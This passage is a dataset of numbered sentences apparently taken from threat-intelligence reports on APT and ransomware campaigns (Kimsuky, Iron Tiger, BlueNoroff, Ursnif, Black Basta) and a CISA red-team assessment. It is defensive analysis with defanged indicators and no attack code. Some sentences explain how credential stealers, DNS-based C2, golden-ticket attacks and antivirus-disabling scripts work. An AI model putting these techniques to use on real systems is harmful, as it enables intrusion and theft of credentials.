those files.","8630":"OutlookRansomware will likely continue to be incorporated into the attack methods of threat actors targeting public and private entities in LATAM due to their availability as ransomware-as-a-service (for non-technical threat actors) and highly successful infection rates.","8631":"Compromised accounts and networks are highly sought after by threat actors and will remain in high demand because they can be used in a number of attack vectors, including but not limited to account takeovers, identity theft, social engineering, credential stuffing, and brute forcing.","8632":"As LATAM is an up-and-coming region whose security posture is not as sophisticated or developed as some other regions for various reasons (geopolitical circumstances and developing infrastructure, among others), threat actors may view LATAM entities as easy targets for harvesting sensitive and financially lucrative accounts via infostealer infections.","8633":"As incident response teams in the region build up their security posture, threat actors are likely to continue to enhance and create infostealer variants to target organizations in LATAM with the intent of harvesting personal and corporate account login details and other important data.

","9216":"In wave 1, the wiper malware expected to find the raw disk driver in the execution directory or in the system directory.","9217":"The driver wasn\u2019t dropped by the wiper, and the threat actor likely dropped it using other means.","9218":"Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it.","9219":"In addition, the driver being used by the threat actor in wave 2 seems to copy metadata and a few functions from Microsoft\u2019s diskdump.sys crash dump driver[1] (version 10.0.19041.1682) as another means to avoid detections.","9220":"The wiping activity starts automatically after the driver installation command; as opposed to the wave 1 wiper, where installation is one step and wiping execution is a second step. ","9221":"Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below.","9222":"It\u2019s worth noting that the method IOCTL_DISK_GET_LENGTH_INFO is exclusive to all Persian-speaking APT wipers. ","9223":"Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.","9224":"This targeting is consistent with the previous wave of cyberattacks affecting the Albanian government during the July 2022 wave of cyberattacks. ","9225":"Conclusions In this publication, we discussed the changes made to the second wave of ransomware and wiper samples that targeted Albanian institutions to evade detection and inflict maximum damage. ","9226":"Aside from the changes made to evade detection in wave 2, we suspect that the threat actors needed an automated and speedy wiper execution.","9227":"In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure.","9228":"This is reminiscent of Shamoon operations in the Middle East. ","9229":"Finally, for defenders we can highlight two important elements from the intrusion and malware analysis presented here: Monitor for remote software activities such as AnyDesk for unauthorized use Always hunt and monitor for expired and\/or leaked signing certificates as they can be used by threat actors to load and execute malware Threat detection ","9230":"The detection logic has been improved in all our solutions to ensure that our customers remain protected.","9231":"We continue to investigate this threat using our Threat Intelligence and we will add additional detection logic once they are available.

","9251":"Executive summary BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNoroff group expanded file types and tweaked infection methods; BlueNoroff created numerous fake domains impersonating venture capital companies and banks. ","9252":"Background At the end of September 2022, we observed new BlueNoroff malware in our telemetry.","9253":"After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.","9254":"The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.","9255":"They also started using disk image file formats, .iso","9256":"and .vhd, to deliver their malware.","9257":"For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.","9258":"Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.

","9584":"The campaign has the objective of stealing Google and subscription credentials of a reputable news and analysis service focusing on North Korea, as well as delivering reconnaissance malware. ","9585":"Kimsuky engages in extensive email correspondence and uses spoofed URLs, websites imitating legitimate web platforms, and Office documents weaponized with the ReconShark malware.

","9587":"Overview ","9588":"In collaboration with NK News, a leading subscription-based service that provides news and analyses about North Korea, SentinelLabs has been tracking a targeted social engineering campaign against experts in North Korean affairs from the non-government sector.","9589":"The campaign focuses on theft of email credentials, delivery of reconnaissance malware, and theft of NK News subscription credentials.","9590":"Based on the used malware, infrastructure, and tactics, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor. ","9591":"The social engineering tactics and some infrastructure characteristics closely relate to a Kimsuky activity privately reported by PwC and discussed in an NSA advisory published during the writing of this article.","9592":"We focus on the specific targeting of expert analysts of North Korean affairs by impersonating NK News and stealing NK News credentials, and provide details on used TTPs to support collaborative hunting and detection efforts. ","9593":"Kimsuky, a suspected North Korean advanced persistent threat (APT) group whose activities align with the interests of the North Korean government, is known for its global targeting of organizations and individuals.","9594":"Operating since at least 2012, the group often employs targeted phishing and social engineering tactics to gather intelligence and access sensitive information. ","9595":"A hallmark of the activity we discuss in this post is Kimsuky\u2019s focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities.","9596":"As part of their initial contact strategy, the group impersonated Chad O\u2019Carroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.]pro, which closely resembles the legitimate NK News domain nknews.org.","9597":"The initial email requests the review of a draft article analyzing the nuclear threat posed by North Korea. ","9598":"If the target engages in the conversation, Kimsuky uses the opportunity to deliver a spoofed URL to a Google document, which redirects to a malicious website specifically crafted to capture Google credentials.","9599":"Kimsuky may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware. ","9600":"Further, Kimsuky\u2019s objective extends to the theft of subscription credentials from NK News.","9601":"To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site.","9602":"The login form that is presented to the target is designed to capture entered credentials. ","9603":"This Kimsuky activity indicates the group\u2019s growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations, including the delivery of malware.","9604":"Their approach highlights the group\u2019s commitment to creating a sense of rapport with the individuals they target, potentially increasing the success rate of their subsequent malicious activities. ","9605":"By actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea, Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea, such as the country\u2019s military activities.","9606":"These actions are probably part of their broader objective to gather strategic intelligence, contributing to North Korea\u2019s decision-making processes. ","9607":"Google Credential Theft We observed Kimsuky distributing an HTML-formatted phishing email to selected individuals, which requests the review of a draft article analyzing the nuclear threat posed by North Korea.","9608":"The email primarily aims to initiate a subsequent conversation and is intentionally designed to appear benign: It impersonates NK News leadership and lacks any malicious artifacts. ","9609":"Initial email If the target engages in the conversation, Kimsuky eventually follows up with an email that contains an URL to a Google document. ","9610":"Follow-up email If the target is not responsive, Kimsuky follows up with a reminder email in an attempt to engage the target in conversation. ","9611":"Reminder email The URL\u2019s destination is manipulated through the spoofing technique of setting the href HTML property to direct to a website created by Kimsuky.","9612":"This method, commonly employed in phishing attacks, creates a discrepancy between the perceived legitimacy of the link (a genuine Google document) and the actual website visited upon clicking the URL. ","9613":"The displayed URL to a Google document points to an actual article hosted on Google Docs, delving into the topic of the North Korean nuclear threat.","9614":"The article contains visible edits to give the impression of a genuine draft article, aligning with Kimsuky\u2019s luring tactic. ","9615":"Google document The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such as https[:\/\/]drive-google[.]shanumedia[.]com\/pdf\/ul\/ji78fghJHKtgfLKJIO\/s2.php?menu=ZGFu[...]vbQ== The Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target\u2019s email address. ","9616":"This serves as a means of transporting the target\u2019s address to the fake Google Docs site, which enables the site to dynamically display the address, creating a personalized and convincing appearance of legitimacy.","9617":"The design and functionality of this site suggest its potential for reuse in targeting different individuals. ","9618":"Malicious Google Docs site We were unable to analyze the functionality behind the Request access web element as the group has taken down the site.","9619":"However, given the theme of the site, we suspect that it has been designed to capture entered Google credentials. ","9620":"During conversations with targeted individuals, Kimsuky also seizes any available opportunity to distribute password-protected weaponized Office documents that deploy the ReconShark reconnaissance malware.","9621":"ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.","9622":"The implementation of the ReconShark variant we observed in this activity remains the same as the one covered in our previous post on Kimsuky activity, with the main distinction being the use of a different C2 server: staradvertiser[.]store.","9623":"This domain resolves to the IP address 162.0.209[.]27, which has hosted domains that have been attributed to Kimsuky in previous research, such as sesorin[.]lol and rfa[.]ink.","9624":"Kimsuky\u2019s use of ReconShark as part of this activity underscores the malware\u2019s central role within the group\u2019s current operational playbook. ","9625":"NK News Credential Theft ","9626":"We also observed Kimsuky attempting to steal credentials for the subscription service of NK News, which is known for its comprehensive expert analyses and news reports.","9627":"Gaining access to such reports would provide Kimsuky with valuable insights into how the international community assesses and interprets developments related to North Korea, contributing to their broader strategic intelligence-gathering initiatives. ","9628":"In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service.","9629":"The emails prompt the recipients to confirm their NK News accounts under the pretext of recent security updates.

","10168":"This new version has similar features to the 2021 version, except that the C++ run-time type information (RTTI) classes we previously observed in 2021 had been removed, and that the code structure was changed to use the ASIO C++ asynchronous library.","10169":"Both changes make reverse engineering the samples longer.","10170":"We strongly advise organizations and users in the targeted industries to reinforce their security measures to defend their systems and stored information from this ongoing campaign.

","10178":"Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate \u201cMicrosoft Resource Compiler\u201d signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll. ","10179":"The malicious rc.dll loads a file named rc.bin in memory.

","10183":"The \u201cinstallation\u201d step is considered simple wherein the malware moves the files to a hardcoded folder.","10184":"Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.","10185":"This ensures that the malware will be launched during the next reboot, skipping the installation part. ","10186":"Figure 1.","10187":"Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.","10188":"We identified the executables and sideloaded files as follows: ","10189":"Table 1.","10190":"SysUpdate\u2019s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.","10191":"Wazuh is a free and open source security platform, and we could confirm that one of the victims was using the legitimate Wazuh platform.","10192":"It is highly likely that Iron Tiger specifically looked for this vulnerability to appear legitimate in the victim\u2019s environment.","10193":"We have notified the affected victim of this intrusion but received no feedback.

","10198":"Figure 2.","10199":"C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.","10200":"If this method fails, the malware uses the DNS server operated by Google at IP address 8.8.8.8. ","10201":"For the first request, the malware generates a random number of 32 bits and appends 0x2191 to it.","10202":"This results in six bytes \u2014 four for the random number, two for 0x2191 \u2014 and encodes the result further with Base32 algorithm using the alphabet \u201cabcdefghijklmnopqrstuvwxyz012345\u201d.","10203":"Looking at Figure 2, the contacted domain name is after \"TXT\"; only the first four letters change as the rest of the encoded series is always the same.","10204":"This is because the random number changes every time, but the end is the same \u201c0x2191\u201d result.","10205":"This explains why the first DNS request always ends with \u201creeaaaaaa.<c&c domain>\u201d.","10206":"If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine.

","10217":"SysUpdate samples for Linux While investigating SysUpdate\u2019s infrastructure, we found some ELF files linked to some C&C servers.","10218":"We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.","10219":"The ELF samples were also written in C++, made use of the Asio library, shared common network encryption keys, and had many similar features.","10220":"For example, the file handling functions are almost the same.","10221":"It is possible that the developer made use of the Asio library because of its portability across multiple platforms.

","10233":"Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the following signer: \u201cPermyakov Ivan Yurievich IP\u201d.","10234":"Looking for that name in search engines brings results from the official VMProtect website.","10235":"The email address linked to the Authenticode certificate also links to that domain name.","10236":"VMProtect is a commercial software intended to make analysis of code extremely difficult by implementing a custom virtual machine with non-standard architecture.","10237":"The software has been used by multiple APT and cybercrime groups in the past to obfuscate their malware. ","10238":"When searching on malware repositories for other files signed by the same certificate, we find multiple files named \u201cVMProtectDemo.exe\u201d, \u201cVMProtect.exe\u201d, or \u201cVMProtect_Con.exe\u201d, which suggests that an official demo version of VMProtect is also signed by this certificate.","10239":"It appears that the threat actor managed to retrieve the private key allowing him to sign malicious code.","10240":"As of this writing, the certificate is now revoked. ","10241":"Using stolen certificates to sign malicious code is a common practice for this threat actor, as we already highlighted in 2015 and in all our recent investigations.","10242":"Interestingly, the threat actor not only signed some of its malicious executables with the stolen certificate, but also used VMProtect to obfuscate one of them. ","10243":"In late January 2023, a Redline stealer sample (detected by Trend Micro as TrojanSpy.Win32.REDLINE.YXDA1Z, SHA256: e24b29a1df287fe947018c33590a0b443d6967944b281b70fba7ea6556d00109) signed by the same certificate was uploaded.","10244":"We do not believe that the stealer is linked to Iron Tiger, considering that the network infrastructure is different, and previous reports document the malware\u2019s goals to be centered on committing cybercrime than data theft.","10245":"This could mean other users managed to extract the same private key from the VMProtect demo version, or it was sold in the underground to different groups, Iron Tiger among them. ","10246":"Infection vector We did not find an infection vector.","10247":"However, we noticed that one of the executables packed with VMProtect and signed with the stolen certificate was named \u201cyoudu_client_211.9.194.exe\u201d.","10248":"Youdu is the name of a Chinese instant messaging application aimed for use of enterprise customers.","10249":"Its website mentions multiple customers in many industries, some of them in critical sectors such as government, energy, healthcare, or banking.","10250":"But they also have other customers in industries such as gaming, IT, media, construction, and retail, apparently all located inside China. ","10251":"The properties of the malicious file also match the usual Youdu version numbering.","10252":"However, the legitimate files are signed with a \u201cXinda.im\u201d certificate instead of the stolen VMProtect certificate. ","10253":"Figure 3.","10254":"Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) ","10255":"As seen in the product name identified in the malicious file\u2019s properties, we searched for possible products named \u201ci Talk\u201d but did not find any that could be related to this investigation.","10256":"However, we found traces of files from the legitimate Youdu chat application signed by Xinda.im being copied to folders named \u201ci Talk\u201d on one victim\u2019s computer.","10257":"This suggests that some chat application named \u201ci Talk\u201d might be repackaging components from the official Youdu client along with malicious executables.","10258":"It appears that a chat application was used as a lure to entice the victim into opening the malicious file.","10259":"This would be consistent with the tactics, techniques, and procedures (TTPs) of two previous Iron Tiger campaigns from 2020 and 2021: a documented compromise of a chat application widely used by the Mongolian government, and a supply chain attack on Mimi chat, a chat application used in parts of South East Asia. ","10260":"Post-exploitation tools We found a custom Chrome password and cookie grabber that appeared unfamiliar, and it was compiled and uploaded in September 2022.","10261":"The file was also signed with the VMProtect certificate but it was not obfuscated.","10262":"In general, the features were simple; the malware decrypts the saved passwords to a file named \u201cpasswords.txt\u201d, and the cookies to a file named \u201ccookies.txt\u201d. ","10263":"Analyzing its details, the malware first parses the \u201cLocal State\u201d file to retrieve the AES key used to encrypt the cookies and passwords.","10264":"It then copies the \u201cLogin Data\u201d file to a temporary file \u201cchromedb_tmp\u201d, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the \u201cpasswords.txt\u201d file. ","10265":"It proceeds to copy the \u201cCookies\u201d file to a temporary file \u201cchromedb_tmp\u201d, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the \u201ccookies.txt\u201d file.","10266":"Some specific cookies related to Google domain names are ignored, probably because they are mostly related to specific Google features or tracking that are considered useless by the threat actor. ","10267":"We found two other samples from this stealer: One compilation date indicated an executable built in November 2020, and the other one in December 2021, although those dates could be tampered with.","10268":"We found those samples were uploaded on November 2021 and August 2022, meaning this stealer existed since at least late 2021. ","10269":"Targeting We identified one gambling company in the Philippines as compromised by this campaign.","10270":"Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C.","10271":"This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our Operation DRBControl investigation, and later in 2021 with an update of SysUpdate.","10272":"We also attempted to notify the company of this incident through all their listed channels but have received no feedback. ","10273":"As stated in the \u201cInfection Vector\u201d section, we noticed the Youdu chat application was probably used as a lure.","10274":"It is worth mentioning that the customers mentioned in the Youdu official website are all located inside China, which could be an indicator of the threat actor\u2019s interest in targets related to this country. ","10275":"Conclusion This investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS.","10276":"It also corroborates this threat actor\u2019s interest in the gambling industry and the South East Asia region, as we previously noted in 2020 and 2021. ","10277":"This campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger.","10278":"We expect to find further updates of these tools in the future to accommodate other platforms and apps. ","10279":"As an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed.","10280":"In 2022, we discussed a campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.","10281":"Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate.","10282":"The BfV, a German governmental entity, published a report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate.","10283":"In October 2022, Intrinsec reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 investigation.","10284":"This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term.","10285":"Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group.

","10291":"The Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today.","10292":"It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4. ","10293":"For this report, we have referred to the malware as Ursnif for simplicity, however we also recommend reading Mandiant\u2019s article on LDR4. ","10294":"Case Summary In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.","10295":"The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.","10296":"Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID.","10297":"The malware also established persistence on the host with the creation of a registry run key. ","10298":"Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard).","10299":"The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions. ","10300":"The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.","10301":"Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials. ","10302":"Using the credentials extracted from memory, the threat actors began to move laterally.","10303":"They targeted a domain controller and used Impacket\u2019s wmiexec.py to execute code on the remote host.","10304":"This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon.","10305":"These files were transferred to the domain controller over SMB. ","10306":"After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.","10307":"Finally, they dropped a script named adcomp.bat which executed a PowerShell command to collect data on computers in the Windows domain. ","10308":"The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day.","10309":"At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.","10310":"From there, the threat actor began connecting to various hosts across the network. ","10311":"One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.","10312":"The threat actor was later evicted from the network.

","11103":"Insufficient host and network monitoring.","11104":"Most of the red team\u2019s Phase II actions failed to provoke a response from the people, processes, and technology defending the organization\u2019s network.","11105":"The organization failed to detect lateral movement, persistence, and C2 activity via their intrusion detection or prevention systems, endpoint protection platform, web proxy logs, and Windows event logs.","11106":"Additionally, throughout Phase I, the team received no deconflictions or confirmation that the organization caught their activity.","11107":"Below is a list of some of the higher risk activities conducted by the team that were opportunities for detection: Phishing Lateral movement reuse Generation and use of the golden ticket Anomalous LDAP traffic Anomalous internal share enumeration Unconstrained Delegation server compromise DCSync Anomalous account usage during lateral movement Anomalous outbound network traffic Anomalous outbound SSH connections to the team\u2019s cloud servers from workstations Lack of monitoring on endpoint management systems.","11108":"The team used the organization\u2019s MDM system to gain root access to machines across the organization\u2019s network without being detected.","11109":"Endpoint management systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring. ","11110":"KRBTGT never changed.","11111":"The Site 1 krbtgt account password had not been updated for over a decade.","11112":"The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain.","11113":"Compromise of the krbtgt account could provide adversaries with the ability to sign their own TGTs, facilitating domain access years after the date of compromise.","11114":"The red team was able to use the krbtgt account to forge TGTs for multiple accounts throughout Phase I. Excessive permissions to standard users.","11115":"The team discovered several standard user accounts that have local administrator access to critical servers.","11116":"This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain. ","11117":"Hosts with Unconstrained Delegation enabled unnecessarily.","11118":"Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or \u201csilver ticket\u201d attacks.","11119":"The team performed an NTLM-relay attack to obtain the DC\u2019s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account. Use of non-secure default configurations.","11120":"The organization used default configurations for hosts with Windows Server 2012 R2.","11121":"The default configuration allows unprivileged users to query group membership of local administrator groups.","11122":"The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server. ","11123":"Additional Issues The team noted the following additional issues. ","11124":"Ineffective separation of privileged accounts.","11125":"Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server.","11126":"If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges.","11127":"Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes. ","11128":"Lack of server egress control.","11129":"Most servers, including domain controllers, allowed unrestricted egress traffic to the internet. ","11130":"Inconsistent host configuration.","11131":"The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations.","11132":"For example, some workstations had \u201cServer Admins\u201d or \u201cDomain Admins\u201d as local administrators, and other workstations had neither. ","11133":"Potentially unwanted programs.","11134":"The team noticed potentially unusual software, including music software, installed on both workstations and servers.","11135":"These extraneous software installations indicate inconsistent host configuration (see above) and increase the attack surfaces for malicious actors to gain initial access or escalate privileges once in the network. ","11136":"Mandatory password changes enabled.","11137":"During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified.","11138":"This is potentially due to domain passwords being required to be changed every 60 days. ","11139":"Smart card use was inconsistent across the domain.","11140":"While the technology was deployed, it was not applied uniformly, and there was a significant portion of users without smartcard protections enabled.","11141":"The team used these unprotected accounts throughout their assessment to move laterally through the domain and gain persistence. ","11142":"Noted Strengths The red team noted the following technical controls or defensive measures that prevented or hampered offensive actions: The organization conducts regular, proactive penetration tests and adversarial assessments and invests in hardening their network based on findings. ","11143":"The team was unable to discover any easily exploitable services, ports, or web interfaces from more than three million external in-scope IPs.","11144":"This forced the team to resort to phishing to gain initial access to the environment. ","11145":"Service account passwords were strong.","11146":"The team was unable to crack any of the hashes obtained from the 610 service accounts pulled.","11147":"This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I. ","11148":"The team did not discover any useful credentials on open file shares or file servers.","11149":"This slowed the progress of the team from moving around the network. ","11150":"MFA was used for some SBSs.","11151":"The team was blocked from moving to SBS 2 by an MFA prompt. ","11152":"There were strong security controls and segmentation for SBS systems.","11153":"Direct access to SBS were located in separate networks, and admins of SBS used workstations protected by local firewalls.

","11161":"Create alerts for Windows event log authentication codes, especially for the domain controllers.","11162":"This could help detect some of the pass-the-ticket, DCSync, and other techniques described in this report. ","11163":"From a detection standpoint, focus on identity and access management (IAM) rather than just network traffic or static host alerts. ","11164":"Consider who is accessing what (what resource), from where (what internal host or external location), and when (what day and time the access occurs). ","11165":"Look for access behavior that deviates from expected or is indicative of AD abuse. ","11166":"Reduce the attack surface by limiting the use of legitimate administrative pathways and tools such as PowerShell, PSExec, and WMI, which are often used by malicious actors.","11167":"CISA recommends selecting one tool to administer the network, ensuring logging is turned on [CPG 3.1], and disabling the others.

","11183":"Separate administrator accounts from user accounts [CPG 1.5].","11184":"Only allow designated admin accounts to be used for admin purposes.","11185":"If an individual user needs administrative rights over their workstation, use a separate account that does not have administrative access to other hosts, such as servers. Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources","11186":"[CPG 3.4].","11187":"PAM solutions can also log and alert usage to detect any unusual activity and may have helped stop the red team from accessing resources with admin accounts.","11188":"Note: password vaults associated with PAM solutions should be treated as HVAs with additional restrictions and monitoring (see below). ","11189":"Configure time-based access for accounts set at the admin level and higher.","11190":"For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege, as well as the Zero Trust model.","11191":"This is a process in which a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need.","11192":"When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion.

","11412":"RELATED TO THIS STORY ","11413":"The timeline below shows a high-level overview of the incident: INITIAL ACCESS The Threat Actor began this attack by compromising a user account at a third-party vendor (TPV).","11414":"Although little is known to Quadrant about the compromise on the TPV, access allowed for the use of an \"info@\" account.","11415":"The use of such an account would have allowed the Threat Actor to pose as the compromised user without creating extra \"junk\" in the user's inbox which could raise suspicion.","11416":"Following initial phishing emails, the threat actor continued to submit additional phishing emails to the client via similar account names from different domains.","11417":"Both samples reached their victims shortly after noon on the 20th of September ","11418":"The phishing emails contained what was later determined to be \"Qakbot,\" a sophisticated trojan.","11419":"Following the infection, these hosts began to beacon on out to over 100 IP's using various ports.","11420":"The client\u2019s Cisco \u201cAdvanced Malware Protection\u201d (AMP) detected a connection with one of these IP's over TCP port 2222.","11421":"Although this did trigger an alert in AMP, the Quadrant ingestion of these logs was not configured, so this did not generate an alert through the Sagan Solution. ","11422":"The Suricata engine did detect these connection attempts, however no alert was raised by the Packet Inspection Engine.","11423":"Quadrant monitors companies' ingress and egress traffic using onsite Packet Inspection Engine (PIE) appliances running the Suricata Detection engine.","11424":"Although many other rulesets are used to screen for malicious activity, Quadrant has custom rules in place to detect SSH over nonstandard ports, such as TCP 2222.","11425":"These rules did not fire due to the absence of an SSH header in the traffic.","11426":"One may assume that traffic over 2222 would be SSH traffic, however further analysis of the traffic generated by the Qakbot Sample in the lab shows that this connection was likely HTTPS in nature. ","11427":"Eventually, the malware was able to find an active C2 server.","11428":"It took about 35 minutes between initial infection and the first successful communication between a compromised host and the C2 domain.","11429":"The second stage payload, which was later determined to likely be the penetration testing framework \"Brute Ratel,\" was then downloaded via a connection to an IP from Russia. ","11430":"PERSISTENCE AND ESCALATION OF PRIVILEGE Following the compromise of two hosts and gaining a foot hold, lateral movement began.","11431":"The client's full infrastructure is comprised of three domains: Construction, Commerce, and a Subsidiary.","11432":"Both initial compromised hosts were in the Construction environment.","11433":"These domains had shared trust and were connected via VPN tunnels which allowed the threat actor to move freely between domains. ","11434":"We believe that multiple methods and tools were leveraged in order to do this.","11435":"At this point, visibility becomes muddled due to the focus of observation and detection is ingress and egress traffic.","11436":"However, following the investigation into the recorded logs and the follow-on detailed analysis of malware samples, we can make educated guesses on some of the missing pieces. ","11437":"Initial lateral movement and the lay of the land was likely conducted using Brute Ratel.","11438":"This was determined through a review of files found on one of the initially compromised hosts.","11439":"One file, \"zfgufgfvezdnbcvjkzctpvfdj.dll,\" matches the hash of previously submitted Brute Ratel samples. ","11440":"Due to the lack of visibility, we were unable to find the initial connection from the two \"Patient Zeros\" to the local Domain Controller.","11441":"However, after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains. ","11442":"Initial Command and Control was conducted from \"23[.]19[.]58[.]43\"[zedorocop[.]com] and \"23[.]106[.]160[.]141\" [danimos[.]com].","11443":"The IP\u2019s used for C2 and the level of interaction changed over time as the compromise grew. ","11444":"For example, mid-stage infections showed calls to \"146[.]70[.]86[.]44\"[gerhiles[.]com].","11445":"It\u2019s important to note that the FQDN\u2019s that were used as C2 were all registered the same month as the compromise. ","11446":"Multiple administrative and system accounts were compromised during this incident.","11447":"One possible explanation for this comes from \u201cKerberoasting\u201d.","11448":"This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.","11449":"We do not believe that this was successful in this environment, due in part to the lack of additional signs of compromise specific to this Domain.","11450":"However, this technique was likely performed on the other two client domains where visibility gaps existed.","11451":"This is further supported by the source and destination of these requests were cross domain: The source of the \u201cKerberoasting\u201d was based in the Subsidiary environment and the Domain Controller that was attacked was in the Commerce environment. ","11452":"Once administrative access had been achieved, the threat actor also added new administrative accounts to the environment. ","11453":"PROPAGATION Unknown to everyone but the attacker, multiple files were being transmitted throughout the environment: Two file names were observed during the incident \"Client_s.exe\" and \"Client.exe.\"","11454":"It is expected that the different naming schemes are related to the different variations of the Black Basta ransomware.","11455":"Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of \"Client_s.exe\" for Windows hosts. ","11456":"Two \".bat\" files were sent throughout the organization.","11457":"Both were designed to turn off antivirus and anti-malware software.","11458":"One does not use any obfuscation and just contains the simple command to stop Cisco AMP Orbital.","11459":"This could indicate that it was written hastily in order to get it onto the target environments quickly.","11460":"The other, targeting Windows 